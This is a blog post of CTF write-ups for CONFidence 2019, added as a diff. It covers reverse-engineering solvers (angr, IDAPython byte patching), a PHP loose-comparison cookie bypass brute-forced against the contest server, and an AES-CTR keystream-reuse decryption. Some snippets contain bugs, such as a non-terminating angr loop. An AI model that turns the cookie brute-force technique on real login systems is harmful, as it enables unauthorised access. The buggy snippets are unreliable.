@@ -1,0 +1,647 @@
+---
+title: "2019::CONFidence"
+description: ""
+publishDate: "2019-03-17"
+category: "CTF"
+layout: "../../layouts/ArticleLayout.astro"
+---
+
+
+Teaching CPR during the contest, so I decided to spend the next few day to sovle these challenges without looking writeups.
+
+# Reverse::Elementary
+
+## TL;DR
+
+Solve this with angr is quick and easy
+
+```py solver.py
+import angr
+import claripy
+f = open("./elementary","r").read()
+r = []
+a = 0
+find = 0x40077f
+while True:
+    #find all the
+    #   mov eax,0 
+    #   jmp xxxxxx
+    p = f.find("\xB8\x00\x00\x00\x00\xE9",a+1)
+    if a == -1:
+        break
+    r.append(a+0x400000)
+p = angr.Project("./elementary")
+flag_chars = [claripy.BVS('flag_%d' % i, 8) for i in range(104)]
+flag = claripy.Concat(*flag_chars)
+st = p.factory.blank_state(stdin=flag)
+simgr = p.factory.simgr(st)
+simgr.explore(avoid=tuple(r),find=find)
+print simgr.found[0].posix.dumps(0)
+```
+
+flag:`p4{I_really_hope_you_automated_this_somehow_otherwise_it_might_be_a_bit_frustrating_to_do_this_manually}`
+
+## details
+
+The binary has lots of trivial functions, some of them return the `arg1` directly, the others return `arg1^1`, this prevents us from parsing the decompile result directly. The angr help us to solve this challenge without knowing anything about those functions.
+
+The other option to solve this is to laverage idapython to parse the decompile result directly, I used to do so.
+
+# Reverse::Old school
+
+## pseudo code
+
+```py logic.py
+
+def sub_10148():
+    position = 0x50
+    for i in range(9):
+        input = input("hex")
+        input = int(input,16)
+
+        # column direction
+        if input & 1 = 1
+                if position is 0 or position%18 != 16: #18 is the chars number in a row
+                    position += 1
+        if !(input & 1)
+                if position is not 0 or position%18 != 0:
+                    position -= 1
+
+        # row direction
+        if input & 2:
+            if position < 0x8f: #0xa1/18 is the total rows of the output
+                position += 18
+        if !(input & 2):
+            position > 17:
+                position -= 18
+
+        input = input >> 2       # process next to bits of user input
+        memory[position] +=1
+
+def sub_10215():
+    string = "p4{krule_ctf}"
+    position = 0
+    for i in range(0xa1):
+
+        if array[memory[position]] > 0xd:
+            bl = 0x5e
+        else:
+            bl = string[memory[position]+0xbc]
+
+        memory[position] = bl
+        position += 1
+```
+
+## details
+
+The binary ask for 18 hexadecimal digits to draw a graph. Every two of them will be consider as a number, eg: `1a` = $26_{10}$. Then, for each number, every two bits of them indicate a way to move on a 2D-array on memory. So, at the end of the funciton `sub_10148`, the data in 2D-array implys that how much times we walk on to a corresponding position.
+  
+What `sub_10215` does is replace the number in array to the corresponding character in string `p4{krule_ctf}`. And `S` and `E` in the flag.txt means the start point and the end point. In summary, all we need to do is to find a way to move from `S` to `E` and also satify all the numbers marked on each position.
+
+Backtracking is a good choice, but I drew it on paper.
+
+```py original-array
+        2 3211
+       1 3423 E
+      1 2213 1
+       2 1
+        S
+
+My solution is : ↖↖↗↗ ↘↙↙↗ ↘↗↖↖ ↘↗↘↖ ↘↗↖↖ ↗↙↙↗ ↙↗↘↖ ↘↗↙↗ ↗↙↘↗
+```
+
+Hexadecimal solution is `50 6b 07 37 07 69 36 67 79` (there should be no space in input)
+
+# Reverse::Pudliszki
+
+## details 
+
+This challange gives us a .jar, after decompile, there is a package call kotlin inside it, it's another language designed for JVM, I've never heard of it ..., the result of decompiler looks like a mess .... , and there are some weird class like `p.class`,`{.class`, `}.class`. It's obviously would be use to verify the flag later.
+
+Take a look on main first :
+
+```java FlagCheckerKt.class
+public final class FlagCheckerKt
+{
+  public static final void main(@NotNull String[] args)
+  {
+    Intrinsics.checkParameterIsNotNull(args, "args");
+    String[] $receiver = args;
+    int $i$a$-with-FlagCheckerKt$main$1 = 0;
+    SizeResult localSizeResult = SizeResultFactory.Companion.check($receiver.length, A.class);
+    if ((localSizeResult instanceof Correct))
+    {
+      String str1;
+      if (validateFlag($receiver[0]) == 0)
+      {
+        str1 = "Nice!";System.out.print(str1);
+      }
+      else
+      {
+        str1 = "Not today";System.out.print(str1);
+        int i = -1;System.exit(i);throw ((Throwable)new RuntimeException("System.exit returned normally, while it was supposed to halt JVM."));
+      }
+    }
+    else if ((localSizeResult instanceof Incorrect))
+    {
+      String str2 = "Failed";System.out.print(str2);
+      int j = -1;System.exit(j);throw ((Throwable)new RuntimeException("System.exit returned normally, while it was supposed to halt JVM."));
+    }
+  }
+```
+
+`SizeResult localSizeResult = SizeResultFactory.Companion.check($receiver.length, A.class);`, this line checks the number of args equals to the length of the name of class A or not. Then, call `validateFlag` to verify the arg.
+
+The decompiled result of `validFlag` is a mess, need patience to read it, and try to write a couple lines of kotlin. Basically, what `validFlag` does is :
+
+1. Turn the `flag` into a list of tuple, eg: `String "abab" -> List [(a,0),(b,1),(a,2),(b,3)]`
+
+2. Group the list from step 1 according to the `first` in each tuple, eg: `List [(a,0),(b,1),(a,2),(b,3)] -> LinkedHashMap {a=[0,2],b=[1,3]}`
+
+3. Call `checksum` to do some caculation on the LinkedHashMap from step 2
+
+Follow into the function `checksum` :
+
+1. Call `compress` to compress the list in LinkedHashMap. ` LinkedHashMap {a=[0,2],b=[1,3]} -> Collection {(a.class object instance, 0*1+2*32),(b,calss object instance, 1*1+3*32)}`
+
+2. Do some caculate according to the `first` of each tuple and append it to a temp Collection.
+
+3. Apply `sum` on the Collection  and return the result, which should be `0`
+
+The caculate in step 2 is :
+
+```java
+localObject3 = Integer.valueOf(($i$a$-map-FlagCheckerKt$checksum$1 instanceof }) ? ((Number)entry.getSecond()).intValue() - 27 :
+ ($i$a$-map-FlagCheckerKt$checksum$1 instanceof _) ? ((Number)entry.getSecond()).intValue() - 19849 :
+ ($i$a$-map-FlagCheckerKt$checksum$1 instanceof u) ? ((Number)entry.getSecond()).intValue() - 25 :
+ ($i$a$-map-FlagCheckerKt$checksum$1 instanceof t) ? ((Number)entry.getSecond()).intValue() - 5 :
+ ($i$a$-map-FlagCheckerKt$checksum$1 instanceof s) ? ((Number)entry.getSecond()).intValue() - 11 :
+ ($i$a$-map-FlagCheckerKt$checksum$1 instanceof n) ? ((Number)entry.getSecond()).intValue() - 8 :
+ ($i$a$-map-FlagCheckerKt$checksum$1 instanceof l) ? ((Number)entry.getSecond()).intValue() - 486 :
+ ($i$a$-map-FlagCheckerKt$checksum$1 instanceof k) ? ((Number)entry.getSecond()).intValue() - 643 :
+ ($i$a$-map-FlagCheckerKt$checksum$1 instanceof i) ? ((Number)entry.getSecond()).intValue() - 16 :
+ ($i$a$-map-FlagCheckerKt$checksum$1 instanceof h) ? ((Number)entry.getSecond()).intValue() - 786 :
+ ($i$a$-map-FlagCheckerKt$checksum$1 instanceof e) ? ((Number)entry.getSecond()).intValue() - 21 :
+ ($i$a$-map-FlagCheckerKt$checksum$1 instanceof c) ? ((Number)entry.getSecond()).intValue() - 23 :
+ ($i$a$-map-FlagCheckerKt$checksum$1 instanceof 7) ? ((Number)entry.getSecond()).intValue() - 22 :
+ ($i$a$-map-FlagCheckerKt$checksum$1 instanceof 5) ? ((Number)entry.getSecond()).intValue() - 17 :
+ ($i$a$-map-FlagCheckerKt$checksum$1 instanceof 1) ? ((Number)entry.getSecond()).intValue() - 327 :
+ ($i$a$-map-FlagCheckerKt$checksum$1 instanceof 0) ? ((Number)entry.getSecond()).intValue() - 452 :
+ ($i$a$-map-FlagCheckerKt$checksum$1 instanceof {) ? ((Number)entry.getSecond()).intValue() - 2 :
+ ($i$a$-map-FlagCheckerKt$checksum$1 instanceof 4) ? ((Number)entry.getSecond()).intValue() - 1 :
+ ($i$a$-map-FlagCheckerKt$checksum$1 instanceof p) ? ((Number)entry.getSecond()).intValue() - 27040 :
+ 64199);
+```
+
+Get the flag by factorizing those number.
+
+flag:
+`p4{k0tl1n_1s_p0li5h_ke7chup}`
+
+# Reverse::Watchmem
+
+The binary fork itself by createprocess, then it would try to act like a debugger. When the children return a singal single step or signal illegal instrution, it will  decode the real instructions and put it back, and recover it after execution.
+It's time comsuming to fully understand the mechanism, I try to analyze the pattern by hook WriteProcessMemory,which can be done by dll injection or debugger script. This is the snippet of result :
+
+```python
+0x401e69 2 #patch 0x401e69 0x401e69+1
+0xc9 0x8d   #change the bytes to 0xc9 0x8d
+0x401e69 16
+0x55 0x95 0xa9 0xbd 0x94 0x10 0xb1 0xe 0x8 0x28 0x96 0x55 0xca 0xb0 0xc3 0xb 
+0x401e69 16
+0xc9 0x8d 0x31 0x9b 0x2a 0x56 0x57 0x12 0x7a 0xb0 0x72 0x15 0xfe 0x36 0x4d 0x4f 
+0x401e69 2
+0xf 0xb
+0x401e6a 1
+0x95
+```
+
+It turns out that the second records always be the decoded instruction. So, all we need to do is patch it by IDApython
+
+```python ida.py
+def go_patch(patch):
+    for i in patch:
+        ea = int(i[0],16)
+        p = i[1].split(" ")
+        for k in range(len(p)):
+                idc.PatchByte( ea+k , int(p[k],16))
+patch = [[' 00401E69', 'c9'],
+ [' 00401E6A', '89 e5'],
+ [' 00401E6C', '83 ec 48'],
+ [' 00401E6F', 'c7 04 24 cc a0 43 00'],
+ [' 00401E76', 'e8 c9 4f 03 00 d5 23 64 9d e8 fa de 8d 34 9a 05'],
+ [' 00436E44', ''],
+ [' 00401E7B', '8d 45 d6'],
+ [' 00401E7E', '89 44 24 04'],
+ [' 00401E82', 'c7 04 24 2f a1 43 00'],
+ [' 00401E89', 'e8 ae 4f 03 00 d5 23 69 41 28 15 78 b0 58 4d 07'],
+ [' 00436E3C', ''],
+ [' 00401E8E', 'a1 a8 d1 43 00'],
+ [' 00401E93', '89 04 24'],
+ [' 00401E96', 'e8 e9 4f 03 00 d5 23 64 9d 28 fa 9c c2 c1 9d cb'],
+ [' 00436E84', ''],
+ [' 00401E9B', '8d 45 d6'],
+ [' 00401E9E', '89 04 24'],
+ [' 00401EA1', ''],
+ [' 00401E30', '55'],
+ [' 00401E31', '89 e5'],
+ [' 00401E33', '83 ec 28'],
+ [' 00401E36', 'c7 45 f4 a8 a0 43 00'],
+ [' 00401E3D', '8b 45 08'],
+ [' 00401E40', '89 04 24'],
+ [' 00401E43', ''],
+ [' 00401E09', '55'],
+ [' 00401E0A', '89 e5'],
+ [' 00401E0C', '83 ec 14'],
+ [' 00401E0F', 'c7 45 fc 00 00 00 00'],
+ [' 00401E16', 'eb 0f 8f a5 22 b9 26 d0 c0 60 3b e1 1f 55 fb d4'],
+ [' 00401E27', '83 7d fc 0f'],
+ [' 00401E2B', ''],
+ [' 00401E18', '8b 45 08'],
+ [' 00401E1B', '89 04 24'],
+ [' 00401E1E', ''],
+ [' 00401DDF', '55'],
+ [' 00401DE0', '89 e5'],
+ [' 00401DE2', '83 ec 04'],
+ [' 00401DE5', '8b 45 08'],
+ [' 00401DE8', '89 04 24'],
+ [' 00401DEB', ''],
+ [' 00401C20', '55'],
+ [' 00401C21', '89 e5'],
+ [' 00401C23', '53'],
+ [' 00401C24', '83 ec 10'],
+ [' 00401C27', 'c7 45 f4 10 a0 43 00'],
+ [' 00401C2E', 'c7 45 f8 00 00 00 00'],
+ [' 00401C35', 'eb 28 8f a5 32 b7 e5 ec a7 4c ab c4 92 d9 b1 d8'],
+ [' 00401C5F', '83 7d f8 1f'],
+ [' 00401C63', ''],
+ [' 00401C37', '8b 55 f8'],
+ [' 00401C3A', '8b 45 08'],
+ [' 00401C3D', '01 d0'],
+ [' 00401C3F', '0f b6 18'],
+ [' 00401C42', '8b 55 f8'],
+ [' 00401C45', '8b 45 f4'],
+ [' 00401C48', '01 d0'],
+ [' 00401C4A', '0f b6 08'],
+ [' 00401C4D', '8b 55 f8'],
+ [' 00401C50', '8b 45 08'],
+ [' 00401C53', '01 d0'],
+ [' 00401C55', '31 cb'],
+ [' 00401C57', '89 da'],
+ [' 00401C59', '88 10'],
+ [' 00401C5B', '83 45 f8 01'],
+ [' 00401C5F', '0f 0b a6 5d a0 44'],
+ [' 00401C65', '90'],
+ [' 00401C66', '83 c4 10'],
+ [' 00401C69', '5b'],
+ [' 00401C6A', '5d'],
+ [' 00401C6B', 'c3 17 83 53 05 e4 e8 8f 5f 0e 33 a0 6a 10 47 5f'],
+ [' 00401DF0', '8b 45 08'],
+ [' 00401DF3', '89 04 24'],
+ [' 00401DF6', ''],
+ [' 00401C6C', '55'],
+ [' 00401C6D', '89 e5'],
+ [' 00401C6F', '83 ec 10'],
+ [' 00401C72', '8b 45 08'],
+ [' 00401C75', '0f b6 00'],
+ [' 00401C78', '88 45 fb'],
+ [' 00401C7B', 'c7 45 fc 00 00 00 00'],
+ [' 00401C82', 'eb 36 8f a5 2e b7 e5 ec a7 4c ab c4 aa a4 1e cc'],
+ [' 00401CBA', '83 7d fc 1e'],
+ [' 00401CBE', ''],
+ [' 00401C84', '8b 55 fc'],
+ [' 00401C87', '8b 45 08'],
+ [' 00401C8A', '01 d0'],
+ [' 00401C8C', '0f b6 00'],
+ [' 00401C8F', 'c0 e8 04'],
+ [' 00401C92', '89 c1'],
+ [' 00401C94', '8b 45 fc'],
+ [' 00401C97', '8d 50 01'],
+ [' 00401C9A', '8b 45 08'],
+ [' 00401C9D', '01 d0'],
+ [' 00401C9F', '0f b6 00'],
+ [' 00401CA2', '0f b6 c0'],
+ [' 00401CA5', 'c1 e0 04'],
+ [' 00401CA8', '09 c1'],
+ [' 00401CAA', '8b 55 fc'],
+ [' 00401CAD', '8b 45 08'],
+ [' 00401CB0', '01 d0'],
+ [' 00401CB2', '89 ca'],
+ [' 00401CB4', '88 10'],
+ [' 00401CB6', '83 45 fc 01'],
+ [' 00401CBA', '0f 0b a2 5e a0 52'],
+ [' 00401CC0', '8b 45 08'],
+ [' 00401CC3', '83 c0 1f'],
+ [' 00401CC6', '0f b6 00'],
+ [' 00401CC9', 'c0 e8 04'],
+ [' 00401CCC', '89 c2'],
+ [' 00401CCE', '0f b6 45 fb'],
+ [' 00401CD2', 'c1 e0 04'],
+ [' 00401CD5', '09 c2'],
+ [' 00401CD7', '8b 45 08'],
+ [' 00401CDA', '83 c0 1f'],
+ [' 00401CDD', '88 10'],
+ [' 00401CDF', '90'],
+ [' 00401CE0', 'c9'],
+ [' 00401CE1', 'c3 17 83 53 07 e4 38 78 a0 d0 7b 11 7a aa e8 d1'],
+ [' 00401DFB', '8b 45 08'],
+ [' 00401DFE', '89 04 24'],
+ [' 00401E01', ''],
+ [' 00401CE2', '55'],
+ [' 00401CE3', '89 e5'],
+ [' 00401CE5', '81 ec c0 00 00 00'],
+ [' 00401CEB', 'c7 45 f0 4c a0 43 00'],
+ [' 00401CF2', 'c7 45 fc 00 00 00 00'],
+ [' 00401CF9', 'eb 29 8f a5 2e b7 d5 f8 1f 88 b5 74 1f 9f ef c5'],
+ [' 00401D24', '83 7d fc 1f'],
+ [' 00401D28', ''],
+ [' 00401CFB', '8b 45 fc'],
+ [' 00401CFE', '8b 55 fc'],
+ [' 00401D01', '89 94 85 6c ff ff ff'],
+ [' 00401D08', '8b 55 fc'],
+ [' 00401D0B', '8b 45 08'],
+ [' 00401D0E', '01 d0'],
+ [' 00401D10', '0f b6 00'],
+ [' 00401D13', '8d 8d 4c ff ff ff'],
+ [' 00401D19', '8b 55 fc'],
+ [' 00401D1C', '01 ca'],
+ [' 00401D1E', '88 02'],
+ [' 00401D20', '83 45 fc 01'],
+ [' 00401D24', '0f 0b a2 5d a0 45'],
+ [' 00401D2A', 'c7 45 f8 00 00 00 00'],
+ [' 00401D31', 'eb 6b 8f a5 32 a9 71 82 0d 23 e2 ff 42 c5 e5 78'],
+ [' 00401D9E', '8b 55 f8'],
+ [' 00401DA1', '8b 45 f0'],
+ [' 00401DA4', '01 d0'],
+ [' 00401DA6', '0f b6 00'],
+ [' 00401DA9', '84 c0'],
+ [' 00401DAB', ''],
+ [' 00401D33', '8b 45 f8'],
+ [' 00401D36', '99'],
+ [' 00401D37', 'c1 ea 1b'],
+ [' 00401D3A', '01 d0'],
+ [' 00401D3C', '83 e0 1f'],
+ [' 00401D3F', '29 d0'],
+ [' 00401D41', '8b 84 85 6c ff ff ff'],
+ [' 00401D48', '88 45 ef'],
+ [' 00401D4B', '8b 55 f8'],
+ [' 00401D4E', '8b 45 f0'],
+ [' 00401D51', '01 d0'],
+ [' 00401D53', '0f b6 00'],
+ [' 00401D56', '0f b6 c0'],
+ [' 00401D59', '83 e0 1f'],
+ [' 00401D5C', '89 c1'],
+ [' 00401D5E', '8b 45 f8'],
+ [' 00401D61', '99'],
+ [' 00401D62', 'c1 ea 1b'],
+ [' 00401D65', '01 d0'],
+ [' 00401D67', '83 e0 1f'],
+ [' 00401D6A', '29 d0'],
+ [' 00401D6C', '89 c2'],
+ [' 00401D6E', '8b 84 8d 6c ff ff ff'],
+ [' 00401D75', '89 84 95 6c ff ff ff'],
+ [' 00401D7C', '8b 55 f8'],
+ [' 00401D7F', '8b 45 f0'],
+ [' 00401D82', '01 d0'],
+ [' 00401D84', '0f b6 00'],
+ [' 00401D87', '0f b6 c0'],
+ [' 00401D8A', '83 e0 1f'],
+ [' 00401D8D', '89 c2'],
+ [' 00401D8F', '0f b6 45 ef'],
+ [' 00401D93', '89 84 95 6c ff ff ff'],
+ [' 00401D9A', '83 45 f8 01'],
+ [' 00401D9E', '0f 0b a6 93 d1 ae 1d 46 0f 60 9e 9a 56 a9 90'],
+ [' 00401DAD', 'c7 45 f4 00 00 00 00'],
+ [' 00401DB4', 'eb 20 8f a5 36 b7 a6 6f 9a 19 f5 63 9f 0f 9a c5'],
+ [' 00401DD6', '83 7d f4 1f'],
+ [' 00401DDA', ''],
+ [' 00401DB6', '8b 45 f4'],
+ [' 00401DB9', '8b 84 85 6c ff ff ff'],
+ [' 00401DC0', '8b 4d f4'],
+ [' 00401DC3', '8b 55 08'],
+ [' 00401DC6', '01 ca'],
+ [' 00401DC8', '0f b6 84 05 4c ff ff ff'],
+ [' 00401DD0', '88 02'],
+ [' 00401DD2', '83 45 f4 01'],
+ [' 00401DD6', '0f 0b aa 5d a0 3c'],
+ [' 00401DDC', '90'],
+ [' 00401DDD', 'c9'],
+ [' 00401DDE', 'c3 17 83 53 05 e4 f4 8f 5f 0e b9 52 46 b0 5c 5c'],
+ [' 00401E06', '90'],
+ [' 00401E07', 'c9'],
+ [' 00401E08', 'c3 17 83 53 05 e4 e4 53 5f 1a a0 52 24 78 a9 c3'],
+ [' 00401E23', '83 45 fc 01'],
+ [' 00401E27', '0f 0b a2 6d a0 2b'],
+ [' 00401E2D', '90'],
+ [' 00401E2E', 'c9'],
+ [' 00401E2F', 'c3 17 83 53 05 e4 d0 53 5f 22 f8 b2 e1 78 09 8d'],
+ [' 00401E48', 'c7 44 24 08 20 00 00 00'],
+ [' 00401E50', '8b 45 08'],
+ [' 00401E53', '89 44 24 04'],
+ [' 00401E57', '8b 45 f4'],
+ [' 00401E5A', '89 04 24'],
+ [' 00401E5D', 'e8 fa 4f 03 00 d5 23 ab 8a f4 d5 c1 45 2d 51 53'],
+ [' 00436E5C', ''],
+ [' 00401E62', '85 c0'],
+ [' 00401E64', '0f 94 c0'],
+ [' 00401E67', 'c9'],
+ [' 00401E68', 'c3 17 83 53 05 e4 b0 53 a0 f2 d4 b2 e1 78 ac 09'],
+ [' 00401EA6', '88 45 f7'],
+ [' 00401EA9', '80 7d f7 00'],
+ [' 00401EAD', '74 0e 8f a5 06 6c 85 6b 88 3c 29 b3 85 58 ff 3d'],
+ [' 00401EBD', 'c7 04 24 80 a1 43 00'],
+ [' 00401EC4', 'e8 7b 4f 03 00'],
+ [' 00401EC9', 'b8 00 00 00 00'],
+ [' 00401ECE', 'c9'],
+ [' 00401ECF', 'c3 5d 01 07 bd 3d 46 4c 55 bd d8 4f cc 7a 76 83']]
+
+ go_patch(patch)
+```
+
+Now we can understand the control flow of the encoded binary.
+Anyway, reverse the operation to get the flag
+
+```python flag.py
+def de_shuffle( decode ):
+    s = map(ord,list("I am tired of Earth, these people. I'm tired of being caught in the tangle of their lives."))
+    num = []
+    t =[]
+    for i in range(32):
+        num.append(i)
+        t.append(decode[i])
+    for j in range(len(s)):
+        temp = num[j%32]
+        num[j%32] = num[s[j]&0x1f]
+        num[s[j]&0x1f] = temp
+    for k in range(32):
+        t[num[k]] = decode[k]
+    return t
+
+
+def de_xor( decode ):
+    s = map(ord,list("October 12th, 1985. Tonight, a comedian died in New York"))
+    for i in range(32):
+        decode[i] = decode[i]^s[i]
+    return decode
+def de_shift(decode):
+    ret = [0]*len(decode)
+    for i in range(len(decode)):
+        num = decode[i]
+        n_1 = num >> 4
+        n = num & 0b1111
+        ret[i] |= n << 4
+        ret[(i+1)%len(ret)] |= n_1
+    return ret
+
+final = [232, 244, 218, 241, 21, 198, 184, 189, 119, 140, 193, 249, 116, 70, 120, 186, 209, 78, 188, 58, 243, 109, 169, 97, 68, 97, 101, 19, 109, 61, 206, 123]
+for i in range(16):
+    final = de_shuffle(final)
+    final = de_shift(final)
+    final = de_xor(final)
+```
+
+# Web::My admin panel
+
+## TL;DR
+
+Set the value of `otadmin` in cookie to `{"hash": 389}`
+
+flag:`p4{wtf_php_comparisons_how_do_they_work}`
+
+## source code
+
+```php login.php.bk
+<?php
+
+include '../func.php';
+include '../config.php';
+
+if (!$_COOKIE['otadmin']) {
+    exit("Not authenticated.\n");
+}
+
+if (!preg_match('/^{"hash": [0-9A-Z\"]+}$/', $_COOKIE['otadmin'])) {
+    echo "COOKIE TAMPERING xD IM A SECURITY EXPERT\n";
+    exit();
+}
+
+$session_data = json_decode($_COOKIE['otadmin'], true);
+
+if ($session_data === NULL) { echo "COOKIE TAMPERING xD IM A SECURITY EXPERT\n"; exit(); }
+
+if ($session_data['hash'] != strtoupper(MD5($cfg_pass))) {
+    echo("I CAN EVEN GIVE YOU A HINT XD \n");
+    for ($i = 0; i < strlen(MD5('xDdddddd')); i++) {
+        echo(ord(MD5($cfg_pass)[$i]) & 0xC0);
+    }
+    // this if branch would print out "I CAN EVEN GIVE YOU A HINT XD 0006464640640064000646464640006400640640646400"
+
+    exit("\n");
+}
+
+display_admin();
+```
+
+## details
+
+The result of md5 (128-bit) would be represented as a sequence of 32 hexadecimal digits. So the meaning of hint is that 0 and 64 are the result of `ord(digits)&0xc0` and `ord(letters)&0xc0` respectively.
+
+Then, the `$session_data['hash'] != strtoupper(MD5($cfg_pass))` is the key point, this is loose comparison. All we need to do is brute force the first three digits to pass this check.
+
+```py solve.py
+import requests
+url = "https://gameserver.zajebistyc.tf/admin/login.php"
+
+for i in range(100,1000):
+    content = requests.get(url,cookies={'otadmin':f'{{"hash": {i}}}'}).content
+    if b'p4' in content:
+        print(content,f"hash = {i}")
+        break
+
+b'Congratulations! p4{wtf_php_comparisons_how_do_they_work}\n' hash = 389
+```
+
+flag
+`p4{wtf_php_comparisons_how_do_they_work}`
+
+# Crypto::Count me in!
+
+## TL;DR
+
+There is a bug inside the `worker_function` due to share a global variable among multiple workers, which causes that different workers use the same keystream to encrypt the plaintext.
+
+## details
+
+The bug is inside the `worker_function`. For example, in this scenario, the `woker_0` is processing `key_stream = aes.encrypt(pad(str(counter)))`, the counter is still `0`, because the `counter += 1` is not executed yet,  what if the `worker_1` is processing `key_stream = aes.encrypt(pad(str(counter)))` at the same time ? They are using the same keystream !
+
+```py count.py
+...
+
+def worker_function(block):
+    global counter
+    key_stream = aes.encrypt(pad(str(counter)))
+    result = xor_string(block, key_stream)
+    counter += 1
+    return result
+
+...
+```
+
+Find possible keys to decrypt flag:
+
+```py solver.py
+from libnum import *
+import string
+
+cipher = open("output.txt","r").read()
+cipher = [ cipher[i:i+32] for i in range(0,len(cipher),32)] ## slice cipher by a chunk size (16byte)
+
+plaintext = """The Song of the Count
+
+You know that I am called the Count
+Because I really love to count
+I could sit and count all day
+Sometimes I get carried away
+I count slowly, slowly, slowly getting faster
+Once I've started counting it's really hard to stop
+Faster, faster. It is so exciting!
+I could count forever, count until I drop
+1! 2! 3! 4!
+1-2-3-4, 1-2-3-4,
+1-2, i love couning whatever the ammount haha!
+1-2-3-4, heyyayayay heyayayay that's the sound of the count
+I count the spiders on the wall...
+I count the cobwebs in the hall...
+I count the candles on the shelf...
+When I'm alone, I count myself!
+I count slowly, slowly, slowly getting faster
+Once I've started counting it's really hard to stop
+Faster, faster. It is so exciting!
+I could count forever, count until I drop
+1! 2! 3! 4!
+1-2-3-4, 1-2-3-4, 1,
+2 I love counting whatever the
+ammount! 1-2-3-4 heyayayay heayayay 1-2-3-4
+That's the song of the Count!"""
+
+key = []
+for i in range(len(plaintext)/16):
+    key.append(int(cipher[i],16)^s2n(plaintext[i*16:i*16+16]))
+
+unpad = lambda s : s if ord(s[-1]) > 16 else s[0:-ord(s[-1])]
+
+flag = ""
+for i in range(len(plaintext)/16+1,len(cipher)):
+     for j in key:
+         s = unpad(n2s(int(cipher[i],16)^j))
+         if all( c in string.printable for c in s):
+            flag += s
+
+print flag
+# p4{at_the_end_of_the_day_you_can_only_count_on_yourself}
+```
+
+Flag:
+`p4{at_the_end_of_the_day_you_can_only_count_on_yourself}`
+
+# Misc
